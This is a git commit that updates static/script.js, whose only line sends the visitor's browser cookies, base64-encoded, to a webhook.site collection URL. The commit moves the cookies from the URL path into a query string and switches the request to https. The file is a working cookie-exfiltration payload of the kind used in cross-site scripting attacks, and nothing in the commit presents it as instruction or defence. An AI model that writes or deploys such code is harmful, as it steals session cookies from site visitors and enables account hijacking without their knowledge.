dabb2e637401df745742cfdd393eea08a77914f7
whitecatmeo <122612581+whitecatmeo@users.noreply.github.com>
2025-08-12 00:01:32 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,1 @@
-fetch("http://webhook.site/76daefe7-aae3-4d5d-926a-7b39ba3e6bf7/" + btoa(document.cookie))
+fetch("https://webhook.site/76daefe7-aae3-4d5d-926a-7b39ba3e6bf7/?q="+btoa(document.cookie));
